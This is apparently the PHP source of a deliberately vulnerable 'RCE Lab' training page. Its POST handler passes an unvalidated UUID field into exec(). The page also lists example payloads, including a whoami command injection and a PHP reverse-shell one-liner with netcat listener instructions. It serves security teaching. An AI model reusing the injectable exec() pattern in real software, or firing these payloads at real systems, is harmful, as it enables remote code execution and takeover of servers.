<?php

$payload_templates = [
    [
        'title' => 'Expected UUID',
        'note'  => "\nUse this UUID, an integer and an alphanumeric string to observe expected behavior",
        'text'  => "9f4c2e1d-6b5a-4c3f-8a2e-1d7c9b0f4e21",
    ],
	  [
        'title' => 'Unexpected Input',
        'note'  => "\nExperiment with different inputs to observe handled errors vs unhandled",
        'text'  => "Change UUID value\nNon-integer in Count\nQuote \" in Token\nQuote \" in UUID ",
    ],
    [
        'title' => 'Whoami Proof of Concept',
        'note'  => "\nInsert this into the field where you observed an unhandled error to return the username the application is running as",
        'text'  => "|\"|whoami ||a #",
    ],
    [
        'title' => 'Reverse Shell Payload',
        'note'  => "\nReplace 127.0.0.1 with your IP address\n\nStart a netcat listener using: nc -nvlp 9000\n\nThis will open a reverse shell on port 9000",
        'text'  => '|"|php -r \'$sock=fsockopen("127.0.0.1",9000);exec("/bin/sh -i <&3 >&3 2>&3");\'||a #',
    ],
];

// HTML escaping helper 
function h(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$api_response = null;

// Handle JSON API only on POST; allow GET to render HTML
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    header("Content-Type: application/json; charset=utf-8");

    $raw = file_get_contents("php://input");
    $filter = json_decode($raw, true);

    if (!is_array($filter)) {
        http_response_code(400);
        echo json_encode(["error" => "Invalid JSON"]);
        exit;
    }

    $uuid  = $filter['uuid']  ?? null;   // user-controlled
    $count = $filter['count'] ?? null; // user-controlled
    $token = $filter['token'] ?? "";   // user-controlled

    // Validation but not uuid
    // Integer range
    if (!is_int($count) || $count < 0 || $count > 100000) {
        http_response_code(400);
        echo "error: Invalid count";
        exit;
    }

    // Alphanumeric token
    if (!preg_match('/^[A-Za-z0-9]{1,64}$/', $token)) {
        http_response_code(400);
        echo "error: Invalid token";
        exit;
    }

    // UnSafe Command Construction

    $cmd = "";
	$cmd = "";
	if ($uuid !== null) {
		$cmd .= " uuid \"{$filter['uuid']}\"";
		}
	$cmd .= " count \"{$filter['count']}\"";
	$cmd .= " token \"{$filter['token']}\"";
	$root= __DIR__ ;
	
    // The command this emulates returns a list of vulnerabilities associated with the UUID
    $cmd = "$root/vulnlist" . $cmd;

    // Execute + Capture Output
    $cmdWithErr = $cmd . " 2>&1";
    $output = [];
    $exitCode = 0;

    exec($cmdWithErr, $output, $exitCode);
    $combinedOutput = implode("\n", $output);

    /* -----------------------------
       Error Handling
    ------------------------------*/
    if ($exitCode !== 0) {
        http_response_code(500);
        echo $combinedOutput;
        exit;
    }

    /* -----------------------------
       Success Response
    ------------------------------*/
    echo $combinedOutput;
    exit;
}

// For GET (and anything else), render HTML:
header("Content-Type: text/html; charset=utf-8");
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>RCE Lab</title>
  <link rel="stylesheet" href="/shared/css/theme.css">
  <link rel="stylesheet" href="/shared/css/header.css">

</head>

<body>
<div class="page-wrap">
<a href="/" class="ctb-home">
    <div class="ctb-header headerpanel" role="banner">
      <div class="ctb-inner">
        <img class="ctb-shield" src="/shared/images/shield.png" alt="" aria-hidden="true" />
        <div class="ctb-text">
          <div class="ctb-title">
            <div class="crevice">CREVICE</div>
            <div class="testbed">TESTBED</div>
          </div>
        </div>
        <div class="ctb-tag">Exploit WebApp Vulnerabilities</div>
      </div>
    </div>
  </a>
 <div class="layout-row">
  <div class="app-container panel">

    <!-- Title + Apply button -->
    <div class="header-row">
  <h2>Filter</h2>
  <div class="button-row">
    <button type="button" id="customizeFilter">Customize Filter</button>
    <button id="run">Apply</button>
  </div>
</div>

<div class="input-panel">

  <div id="uuidRow" style="display:none;">
    <label>UUID</label>
    <input id="uuid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" />
  </div>

  <label>Count (integer)</label>
  <input id="count" type="number" step="1" min="0" max="100000" />

  <label>Token (alphanumeric)</label>
  <input id="token" placeholder="abc123" />

</div>

    <h3>Response</h3>
    <pre id="resp" class="input-panel textborder whitetext"></pre>

</div>
    <!-- Example payloads panel -->
    <div class="payloads-container panel">
      <div class="header-row">
        <h2>Example Payloads</h2>
        <button type="button" id="toggleAllPayloads">Show all</button>
      </div>

  <div class="input-panel" style="margin-bottom:0;">

    <?php foreach ($payload_templates as $idx => $p): ?>

      <div class="payload-block">

        <div class="payload-body" id="payload-<?= $idx ?>">

          <p class="note">
            <strong><?= h($p['title']) ?>:</strong>
            <?= nl2br(h($p['note'])) ?>
          </p>

          <pre><?= h($p['text']) ?></pre>

        </div>

      </div>

    <?php endforeach; ?>

  </div>
</div>

  <div class="text-container">
  <div class="input-panel textborder">
    Demonstration of a Remote Code Execution vulnerability.
  </div>
  </div>
  </div>
  <br>
    <a class="whitetext" href="/">Home</a>
</div>
<div id="filterOverlay" class="filter-overlay" style="display:none;">
  <div class="filter-modal">
    <div class="header-row">
      <h2>Add Filter</h2>
      <button type="button" id="closeFilterPanel">Close</button>
    </div>

    <div class="input-panel" style="margin-bottom:0;">
      <label style="display:flex; align-items:center; gap:8px;">
        <input type="checkbox" id="enableUuidFilter" style="width:auto; margin:0;">
        UUID
      </label>

      <div style="margin-top:14px;">
        <button type="button" id="applyFilterSelection">Apply</button>
      </div>
    </div>
  </div>
</div>
<script src="/shared/scripts/codeInject.js"></script>
<script src="/shared/scripts/payloadsButton.js"></script>

</body>
</html>
